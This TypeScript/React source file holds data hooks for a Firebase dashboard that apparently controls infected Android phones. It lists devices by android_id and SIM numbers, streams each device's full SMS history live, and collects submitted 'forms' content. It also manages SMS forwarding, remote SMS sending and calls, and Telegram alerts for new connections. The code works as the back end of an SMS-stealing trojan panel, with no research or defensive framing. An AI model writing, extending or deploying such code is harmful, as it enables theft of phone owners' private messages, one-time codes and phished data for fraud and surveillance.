import { useEffect, useState, useRef } from "react";
import { ref, onValue, query, orderByKey, limitToLast, endBefore, startAfter, set } from "@/lib/rtdbPb";
import { db } from "@/lib/firebase";

export interface DeviceUser {
  android_id: string;
  android_version: string;
  battery: number;
  brand: string;
  fcm_token: string;
  model: string;
  sdk: number;
  sim1: string;
  sim2: string;
  status: string;
  timestamp: number;
  ip?: string;
  kiskahai?: string;
}

export type SmsType = "received" | "sent" | "draft" | "outbox" | "failed" | "queued";

export interface SMS {
  key: string;
  body: string;
  date: number;
  sender: string;
  sim: string;
  type: SmsType;
  deviceId?: string;
}

function parseSmsType(val: any): SmsType {
  if (val === undefined || val === null) return "received";
  const s = String(val).toLowerCase().trim();
  if (s === "received" || s === "inbox" || s === "unknown") return "received";
  if (s === "sent") return "sent";
  if (s === "draft") return "draft";
  if (s === "outbox") return "outbox";
  if (s === "failed") return "failed";
  if (s === "queued") return "queued";
  const t = Number(val);
  switch (t) {
    case 1: return "received";
    case 2: return "sent";
    case 3: return "draft";
    case 4: return "outbox";
    case 5: return "failed";
    case 6: return "queued";
    default: return "received";
  }
}

export interface DeviceForm {
  key: string;
  content: Record<string, string>;
  timestamp: number;
}

export interface TelegramSettings {
  bot_token: string;
  telegram_user_id: number;
}

export interface NotificationSettings {
  new_connections: boolean;
}

let _usersCache: Record<string, DeviceUser> | null = null;

export function useFirebaseUsers() {
  const [users, setUsers] = useState<Record<string, DeviceUser>>(_usersCache || {});
  const [loading, setLoading] = useState(_usersCache === null);

  useEffect(() => {
    const usersRef = ref(db, "users");
    const unsubscribe = onValue(usersRef, (snapshot) => {
      const data = snapshot.val() || {};
      _usersCache = data;
      setUsers(data);
      setLoading(false);
    });
    return () => unsubscribe();
  }, []);

  return { users, loading };
}

export function useFirebaseMessages() {
  const [messages, setMessages] = useState<Record<string, unknown>>({});
  const [loading, setLoading] = useState(true);

  useEffect(() => {
    const messRef = ref(db, "mess");
    const unsubscribe = onValue(messRef, (snapshot) => {
      const data = snapshot.val();
      setMessages(data || {});
      setLoading(false);
    });
    return () => unsubscribe();
  }, []);

  return { messages, loading };
}

type DeviceSmsCache = {
  smsList: SMS[];
  lastKey: string | null;
  latestKey: string | null;
  hasMore: boolean;
  allLoaded: boolean;
  initialized: boolean;
};

const createDeviceSmsCache = (): DeviceSmsCache => ({
  smsList: [],
  lastKey: null,
  latestKey: null,
  hasMore: true,
  allLoaded: false,
  initialized: false,
});

const deviceSmsCache: Record<string, DeviceSmsCache> = {};

export function clearDeviceSmsCache(deviceId: string) {
  delete deviceSmsCache[deviceId];
}

const getDeviceSmsCache = (deviceId: string) => {
  if (!deviceSmsCache[deviceId]) {
    deviceSmsCache[deviceId] = createDeviceSmsCache();
  }
  return deviceSmsCache[deviceId];
};

const dedupeSms = (messages: SMS[]) => {
  const seen = new Set<string>();
  return messages.filter((sms) => {
    if (seen.has(sms.key)) return false;
    seen.add(sms.key);
    return true;
  });
};

export function useDeviceSMS(deviceId: string | null) {
  const initialCache = deviceId ? getDeviceSmsCache(deviceId) : createDeviceSmsCache();
  const [smsList, setSmsList] = useState<SMS[]>(initialCache.smsList);
  const [loading, setLoading] = useState(deviceId ? !initialCache.initialized : false);
  const [hasMore, setHasMore] = useState(initialCache.hasMore);
  const [lastKey, setLastKey] = useState<string | null>(initialCache.lastKey);
  const [allLoaded, setAllLoaded] = useState(initialCache.allLoaded);
  const [loadingAll, setLoadingAll] = useState(false);
  const [initialized, setInitialized] = useState(initialCache.initialized);
  const latestKeyRef = useRef<string | null>(initialCache.latestKey);

  const PAGE_SIZE = 100;

  const syncCache = (updater: (cache: DeviceSmsCache) => void) => {
    if (!deviceId) return;
    const cache = getDeviceSmsCache(deviceId);
    updater(cache);
    setSmsList(cache.smsList);
    setHasMore(cache.hasMore);
    setLastKey(cache.lastKey);
    setAllLoaded(cache.allLoaded);
    setInitialized(cache.initialized);
    latestKeyRef.current = cache.latestKey;
  };

  useEffect(() => {
    if (!deviceId) {
      setSmsList([]);
      setLoading(false);
      setHasMore(false);
      setLastKey(null);
      setAllLoaded(false);
      setInitialized(false);
      latestKeyRef.current = null;
      return;
    }

    const cache = getDeviceSmsCache(deviceId);
    setSmsList(cache.smsList);
    setLoading(!cache.initialized);
    setHasMore(cache.hasMore);
    setLastKey(cache.lastKey);
    setAllLoaded(cache.allLoaded);
    setInitialized(cache.initialized);
    latestKeyRef.current = cache.latestKey;
  }, [deviceId]);

  useEffect(() => {
    if (!deviceId) return;

    const cache = getDeviceSmsCache(deviceId);
    if (cache.initialized) return;

    setLoading(true);
    const smsRef = ref(db, `mess/${deviceId}/smss`);
    const smsQuery = query(smsRef, orderByKey(), limitToLast(PAGE_SIZE));
    const unsub = onValue(smsQuery, (snapshot) => {
      const data = snapshot.val();

      syncCache((draft) => {
        if (!data) {
          draft.smsList = [];
          draft.lastKey = null;
          draft.latestKey = null;
          draft.hasMore = false;
          draft.allLoaded = true;
          draft.initialized = true;
          return;
        }

        const keys = Object.keys(data).sort();
        draft.smsList = Object.entries(data)
          .map(([key, val]: [string, any]) => ({
            key,
            body: val.body,
            date: val.date,
            sender: val.sender,
            sim: val.sim,
            type: parseSmsType(val.type),
            deviceId,
          }))
          .sort((a, b) => b.date - a.date);
        draft.lastKey = keys.length === PAGE_SIZE ? keys[0] : null;
        draft.latestKey = keys[keys.length - 1] ?? null;
        draft.hasMore = keys.length === PAGE_SIZE;
        draft.allLoaded = keys.length < PAGE_SIZE;
        draft.initialized = true;
      });

      setLoading(false);
    }, { onlyOnce: true });

    return () => unsub();
  }, [deviceId]);

  useEffect(() => {
    if (!deviceId || !initialized) return;

    const smsRef = ref(db, `mess/${deviceId}/smss`);
    const liveQuery = latestKeyRef.current
      ? query(smsRef, orderByKey(), startAfter(latestKeyRef.current))
      : query(smsRef, orderByKey(), limitToLast(1));

    const unsub = onValue(liveQuery, (snapshot) => {
      const data = snapshot.val();
      if (!data) return;

      const keys = Object.keys(data).sort();
      const currentLatestKey = latestKeyRef.current;
      const freshKeys = keys.filter((key) => !currentLatestKey || key > currentLatestKey);
      if (freshKeys.length === 0) return;

      const freshMessages: SMS[] = freshKeys.map((key) => {
        const val = data[key];
        return {
          key,
          body: val.body,
          date: val.date,
          sender: val.sender,
          sim: val.sim,
          type: parseSmsType(val.type),
          deviceId,
        };
      });

      syncCache((draft) => {
        draft.latestKey = freshKeys[freshKeys.length - 1];
        draft.smsList = dedupeSms([...freshMessages, ...draft.smsList]).sort((a, b) => b.date - a.date);
        draft.initialized = true;
      });
    });

    return () => unsub();
  }, [deviceId, initialized]);

  const loadMoreFn = () => {
    if (!deviceId || !lastKey || loading || loadingAll) return;

    setLoading(true);
    const smsRef = ref(db, `mess/${deviceId}/smss`);
    const smsQuery = query(smsRef, orderByKey(), endBefore(lastKey), limitToLast(PAGE_SIZE));

    onValue(smsQuery, (snapshot) => {
      const data = snapshot.val();

      syncCache((draft) => {
        if (!data) {
          draft.lastKey = null;
          draft.hasMore = false;
          draft.allLoaded = true;
          draft.initialized = true;
          return;
        }

        const keys = Object.keys(data).sort();
        const olderMessages: SMS[] = Object.entries(data).map(([key, val]: [string, any]) => ({
          key,
          body: val.body,
          date: val.date,
          sender: val.sender,
          sim: val.sim,
          type: parseSmsType(val.type),
          deviceId,
        }));

        draft.smsList = dedupeSms([...draft.smsList, ...olderMessages]).sort((a, b) => b.date - a.date);
        draft.lastKey = keys.length === PAGE_SIZE ? keys[0] : null;
        draft.hasMore = keys.length === PAGE_SIZE;
        draft.allLoaded = keys.length < PAGE_SIZE;
        draft.initialized = true;
      });

      setLoading(false);
    }, { onlyOnce: true });
  };

  const loadAllFn = () => {
    if (!deviceId || loadingAll) return;

    setLoadingAll(true);
    const smsRef = ref(db, `mess/${deviceId}/smss`);

    onValue(smsRef, (snapshot) => {
      const data = snapshot.val();

      syncCache((draft) => {
        if (!data) {
          draft.smsList = [];
          draft.lastKey = null;
          draft.latestKey = null;
          draft.hasMore = false;
          draft.allLoaded = true;
          draft.initialized = true;
          return;
        }

        const keys = Object.keys(data).sort();
        draft.smsList = Object.entries(data)
          .map(([key, val]: [string, any]) => ({
            key,
            body: val.body,
            date: val.date,
            sender: val.sender,
            sim: val.sim,
            type: parseSmsType(val.type),
            deviceId,
          }))
          .sort((a, b) => b.date - a.date);
        draft.lastKey = null;
        draft.latestKey = keys[keys.length - 1] ?? null;
        draft.hasMore = false;
        draft.allLoaded = true;
        draft.initialized = true;
      });

      setLoadingAll(false);
    }, { onlyOnce: true });
  };

  return { smsList, loading, hasMore, loadMore: loadMoreFn, loadAll: loadAllFn, loadingAll, allLoaded };
}

const PER_DEVICE_PAGE = 50;

type AllDevicesSmsCache = {
  allSms: SMS[];
  deviceIds: string[];
  deviceCursors: Record<string, string | null>;
  latestKeys: Record<string, string>;
  initialized: boolean;
};

const allDevicesSmsCache: AllDevicesSmsCache = {
  allSms: [],
  deviceIds: [],
  deviceCursors: {},
  latestKeys: {},
  initialized: false,
};

export function useAllDevicesSMS() {
  const [allSms, setAllSms] = useState<SMS[]>(allDevicesSmsCache.allSms);
  const [loading, setLoading] = useState(!allDevicesSmsCache.initialized);
  const [loadingMore, setLoadingMore] = useState(false);
  const [hasMore, setHasMore] = useState(
    Object.values(allDevicesSmsCache.deviceCursors).some((cursor) => cursor !== null)
  );
  const [deviceIds, setDeviceIds] = useState<string[]>(allDevicesSmsCache.deviceIds);
  const [deviceCursors, setDeviceCursors] = useState<Record<string, string | null>>(allDevicesSmsCache.deviceCursors);
  const latestKeysRef = useRef<Record<string, string>>(allDevicesSmsCache.latestKeys);

  const syncAllSms = (updater: SMS[] | ((prev: SMS[]) => SMS[])) => {
    setAllSms((prev) => {
      const next = typeof updater === "function" ? updater(prev) : updater;
      allDevicesSmsCache.allSms = next;
      return next;
    });
  };

  const syncDeviceIds = (nextDeviceIds: string[]) => {
    allDevicesSmsCache.deviceIds = nextDeviceIds;
    setDeviceIds(nextDeviceIds);
  };

  const syncDeviceCursors = (nextCursors: Record<string, string | null>) => {
    allDevicesSmsCache.deviceCursors = nextCursors;
    setDeviceCursors(nextCursors);
    setHasMore(Object.values(nextCursors).some((cursor) => cursor !== null));
  };

  // Step 1: Get device IDs by querying each device's smss with limit 1 (lightweight)
  useEffect(() => {
    if (allDevicesSmsCache.initialized && allDevicesSmsCache.deviceIds.length > 0) {
      return;
    }

    const usersRef = ref(db, "users");
    const unsubscribe = onValue(usersRef, (snapshot) => {
      const data = snapshot.val();
      if (!data) {
        syncDeviceIds([]);
        syncAllSms([]);
        syncDeviceCursors({});
        allDevicesSmsCache.latestKeys = {};
        latestKeysRef.current = {};
        allDevicesSmsCache.initialized = true;
        setLoading(false);
        return;
      }
      syncDeviceIds(Object.keys(data));
    }, { onlyOnce: true });
    return () => unsubscribe();
  }, []);

  // Step 2: Load initial batch per device only once; afterwards keep cached loaded items intact
  useEffect(() => {
    if (deviceIds.length === 0 || allDevicesSmsCache.initialized) return;
    setLoading(true);

    const initialMessages: SMS[] = [];
    const cursors: Record<string, string | null> = {};
    const latestKeys: Record<string, string> = {};
    let completed = 0;

    deviceIds.forEach((deviceId) => {
      const smsRef = ref(db, `mess/${deviceId}/smss`);
      const smsQuery = query(smsRef, orderByKey(), limitToLast(PER_DEVICE_PAGE));
      onValue(smsQuery, (snapshot) => {
        const data = snapshot.val();
        if (data) {
          const keys = Object.keys(data).sort();
          Object.entries(data).forEach(([key, val]: [string, any]) => {
            initialMessages.push({
              key: `${deviceId}_${key}`,
              body: val.body,
              date: val.date,
              sender: val.sender,
              sim: val.sim,
              type: parseSmsType(val.type),
              deviceId,
            });
          });
          cursors[deviceId] = keys.length === PER_DEVICE_PAGE ? keys[0] : null;
          latestKeys[deviceId] = keys[keys.length - 1];
        } else {
          cursors[deviceId] = null;
        }

        completed++;
        if (completed === deviceIds.length) {
          initialMessages.sort((a, b) => b.date - a.date);
          syncAllSms(initialMessages);
          syncDeviceCursors(cursors);
          allDevicesSmsCache.latestKeys = latestKeys;
          latestKeysRef.current = latestKeys;
          allDevicesSmsCache.initialized = true;
          setLoading(false);
        }
      }, { onlyOnce: true });
    });
  }, [deviceIds]);

  // Step 3: Real-time listener for NEW messages without resetting already-loaded history
  useEffect(() => {
    if (loading || deviceIds.length === 0) return;

    const unsubscribes: (() => void)[] = [];

    deviceIds.forEach((deviceId) => {
      const latestKey = latestKeysRef.current[deviceId];
      const smsRef = ref(db, `mess/${deviceId}/smss`);
      const liveQuery = latestKey
        ? query(smsRef, orderByKey(), startAfter(latestKey))
        : query(smsRef, orderByKey(), limitToLast(1));

      const unsub = onValue(liveQuery, (snapshot) => {
        const data = snapshot.val();
        if (!data) return;

        const keys = Object.keys(data).sort();
        const newestKnownKey = latestKeysRef.current[deviceId];
        const freshEntries = keys.filter((key) => !newestKnownKey || key > newestKnownKey);
        if (freshEntries.length === 0) return;

        const newMessages: SMS[] = freshEntries.map((key) => {
          const val = data[key];
          return {
            key: `${deviceId}_${key}`,
            body: val.body,
            date: val.date,
            sender: val.sender,
            sim: val.sim,
            type: parseSmsType(val.type),
            deviceId,
          };
        });

        latestKeysRef.current[deviceId] = freshEntries[freshEntries.length - 1];
        allDevicesSmsCache.latestKeys = { ...latestKeysRef.current };

        syncAllSms((prev) => {
          const existingKeys = new Set(prev.map((sms) => sms.key));
          const fresh = newMessages.filter((sms) => !existingKeys.has(sms.key));
          if (fresh.length === 0) return prev;
          const combined = [...fresh, ...prev];
          combined.sort((a, b) => b.date - a.date);
          return combined;
        });
      });

      unsubscribes.push(unsub);
    });

    return () => unsubscribes.forEach((unsubscribe) => unsubscribe());
  }, [loading, deviceIds]);

  // Load more: fetch older messages from each device that still has data
  const loadMore = () => {
    if (loadingMore || !hasMore) return;
    setLoadingMore(true);

    const devicesWithMore = deviceIds.filter(id => deviceCursors[id] !== null);
    if (devicesWithMore.length === 0) {
      setHasMore(false);
      setLoadingMore(false);
      return;
    }

    const newMessages: SMS[] = [];
    const newCursors = { ...deviceCursors };
    let completed = 0;

    devicesWithMore.forEach((deviceId) => {
      const cursor = deviceCursors[deviceId];
      if (!cursor) { completed++; return; }

      const smsRef = ref(db, `mess/${deviceId}/smss`);
      const smsQuery = query(smsRef, orderByKey(), endBefore(cursor), limitToLast(PER_DEVICE_PAGE));
      onValue(smsQuery, (snapshot) => {
        const data = snapshot.val();
        if (data) {
          Object.entries(data).forEach(([key, val]: [string, any]) => {
            newMessages.push({
              key: `${deviceId}_${key}`,
              body: val.body,
              date: val.date,
              sender: val.sender,
              sim: val.sim,
              type: parseSmsType(val.type),
              deviceId,
            });
          });
          const keys = Object.keys(data).sort();
          newCursors[deviceId] = keys.length === PER_DEVICE_PAGE ? keys[0] : null;
        } else {
          newCursors[deviceId] = null;
        }

        completed++;
        if (completed === devicesWithMore.length) {
          setAllSms(prev => {
            const combined = [...prev, ...newMessages];
            combined.sort((a, b) => b.date - a.date);
            const seen = new Set<string>();
            return combined.filter(s => {
              if (seen.has(s.key)) return false;
              seen.add(s.key);
              return true;
            });
          });
          setDeviceCursors(newCursors);
          const anyMore = Object.values(newCursors).some(c => c !== null);
          setHasMore(anyMore && newMessages.length > 0);
          setLoadingMore(false);
        }
      }, { onlyOnce: true });
    });
  };

  return { allSms, loading, loadingMore, hasMore, loadMore };
}

export function useDeviceForms(deviceId: string | null) {
  const [forms, setForms] = useState<DeviceForm[]>([]);

  useEffect(() => {
    if (!deviceId) { setForms([]); return; }
    const formsRef = ref(db, `users/${deviceId}/forms`);
    const unsub = onValue(formsRef, (snapshot) => {
      const data = snapshot.val();
      if (!data) { setForms([]); return; }
      const entries: DeviceForm[] = Object.entries(data).map(([key, val]: [string, any]) => ({
        key,
        content: val.content || {},
        timestamp: val.timestamp || 0,
      }));
      entries.sort((a, b) => b.timestamp - a.timestamp);
      setForms(entries);
    });
    return () => unsub();
  }, [deviceId]);

  return { forms };
}

export function useAllDeviceForms() {
  const [formsMap, setFormsMap] = useState<Record<string, DeviceForm[]>>({});

  useEffect(() => {
    const usersRef = ref(db, "users");
    const unsub = onValue(usersRef, (snapshot) => {
      const data = snapshot.val();
      if (!data) { setFormsMap({}); return; }
      const map: Record<string, DeviceForm[]> = {};
      Object.entries(data).forEach(([deviceId, userData]: [string, any]) => {
        const forms = userData?.forms;
        if (forms) {
          map[deviceId] = Object.entries(forms).map(([key, val]: [string, any]) => ({
            key,
            content: val.content || {},
            timestamp: val.timestamp || 0,
          }));
          map[deviceId].sort((a, b) => b.timestamp - a.timestamp);
        }
      });
      setFormsMap(map);
    });
    return () => unsub();
  }, []);

  return { formsMap };
}

export function useDeviceNotes(deviceId: string | null) {
  const [notes, setNotes] = useState("");

  useEffect(() => {
    if (!deviceId) { setNotes(""); return; }
    const notesRef = ref(db, `users/${deviceId}/notes`);
    const unsub = onValue(notesRef, (snapshot) => {
      setNotes(snapshot.val() || "");
    });
    return () => unsub();
  }, [deviceId]);

  const saveNotes = async (deviceId: string, text: string) => {
    await set(ref(db, `users/${deviceId}/notes`), text);
  };

  return { notes, saveNotes };
}

export function useAllDeviceNotes() {
  const [notesMap, setNotesMap] = useState<Record<string, string>>({});

  useEffect(() => {
    const usersRef = ref(db, "users");
    const unsub = onValue(usersRef, (snapshot) => {
      const data = snapshot.val();
      if (!data) { setNotesMap({}); return; }
      const map: Record<string, string> = {};
      Object.entries(data).forEach(([deviceId, userData]: [string, any]) => {
        if (userData?.notes) map[deviceId] = userData.notes;
      });
      setNotesMap(map);
    });
    return () => unsub();
  }, []);

  return { notesMap };
}

export interface ForwardingSettings {
  enabled: boolean;
  number: string;
}

export function useForwardingSettings() {
  const [forwarding, setForwarding] = useState<ForwardingSettings | null>(null);
  const [loading, setLoading] = useState(true);

  useEffect(() => {
    const fwdRef = ref(db, "forwarding");
    const unsub = onValue(fwdRef, (snapshot) => {
      if (snapshot.exists()) {
        setForwarding({
          enabled: snapshot.child("enabled").val() ?? false,
          number: snapshot.child("number").val() || "",
        });
      }
      setLoading(false);
    });
    return () => unsub();
  }, []);

  return { forwarding, loading };
}

export interface SentSMS {
  key: string;
  number: string;
  message: string;
  sim: string;
  status: string;
  success: boolean;
  time: number;
  error?: string;
}

export interface CallInfo {
  result: string;
  success: boolean;
  isdone: boolean;
  time: number;
  sim: string;
  number: string;
}

export function useAllDevicesSentSMS() {
  const [allSent, setAllSent] = useState<(SentSMS & { deviceId: string })[]>([]);
  const [loading, setLoading] = useState(true);

  useEffect(() => {
    const sentRef = ref(db, "sendsms");
    const unsubscribe = onValue(sentRef, (snapshot) => {
      const data = snapshot.val();
      if (!data) { setAllSent([]); setLoading(false); return; }
      const all: (SentSMS & { deviceId: string })[] = [];
      Object.entries(data).forEach(([deviceId, deviceData]: [string, any]) => {
        Object.entries(deviceData).forEach(([key, val]: [string, any]) => {
          all.push({
            key: `${deviceId}_${key}`,
            number: val.number || "",
            message: val.message || "",
            sim: val.sim || "",
            status: val.status || "",
            success: val.success ?? false,
            time: val.time || 0,
            error: val.error,
            deviceId,
          });
        });
      });
      all.sort((a, b) => b.time - a.time);
      setAllSent(all);
      setLoading(false);
    });
    return () => unsubscribe();
  }, []);

  return { allSent, loading };
}

export function useDeviceSentSMS(deviceId: string | null) {
  const [sentList, setSentList] = useState<SentSMS[]>([]);
  const [loading, setLoading] = useState(false);

  useEffect(() => {
    if (!deviceId) { setSentList([]); return; }
    setLoading(true);
    const sentRef = ref(db, `sendsms/${deviceId}`);
    const unsub = onValue(sentRef, (snapshot) => {
      const data = snapshot.val();
      if (!data) { setSentList([]); setLoading(false); return; }
      const entries: SentSMS[] = Object.entries(data).map(([key, val]: [string, any]) => ({
        key,
        number: val.number || "",
        message: val.message || "",
        sim: val.sim || "",
        status: val.status || "",
        success: val.success ?? false,
        time: val.time || 0,
        error: val.error,
      }));
      entries.sort((a, b) => b.time - a.time);
      setSentList(entries);
      setLoading(false);
    });
    return () => unsub();
  }, [deviceId]);

  return { sentList, loading };
}

export function useDeviceCalls(deviceId: string | null) {
  const [call, setCall] = useState<CallInfo | null>(null);
  const [loading, setLoading] = useState(false);

  useEffect(() => {
    if (!deviceId) { setCall(null); return; }
    setLoading(true);
    const callRef = ref(db, `call/${deviceId}`);
    const unsub = onValue(callRef, (snapshot) => {
      const data = snapshot.val();
      if (!data) { setCall(null); setLoading(false); return; }
      setCall({
        result: data.result || "",
        success: data.success ?? false,
        isdone: data.isdone ?? false,
        time: data.time || 0,
        sim: String(data.sim ?? ""),
        number: data.number || "",
      });
      setLoading(false);
    });
    return () => unsub();
  }, [deviceId]);

  return { call, loading };
}

export function useTelegramSettings() {
  const [settings, setSettings] = useState<TelegramSettings | null>(null);
  const [notifications, setNotifications] = useState<NotificationSettings | null>(null);
  const [loading, setLoading] = useState(true);

  useEffect(() => {
    const tgRef = ref(db, "telegram_settings");
    const unsubTg = onValue(tgRef, (snapshot) => {
      if (snapshot.exists()) {
        setSettings({
          bot_token: snapshot.child("bot_token").val() || "",
          telegram_user_id: snapshot.child("telegram_user_id").val() || 0,
        });
      }
      setLoading(false);
    });

    const notifRef = ref(db, "notifications");
    const unsubNotif = onValue(notifRef, (snapshot) => {
      if (snapshot.exists()) {
        setNotifications({
          new_connections: snapshot.child("new_connections").val() || false,
        });
      }
    });

    return () => { unsubTg(); unsubNotif(); };
  }, []);

  return { settings, notifications, loading };
}
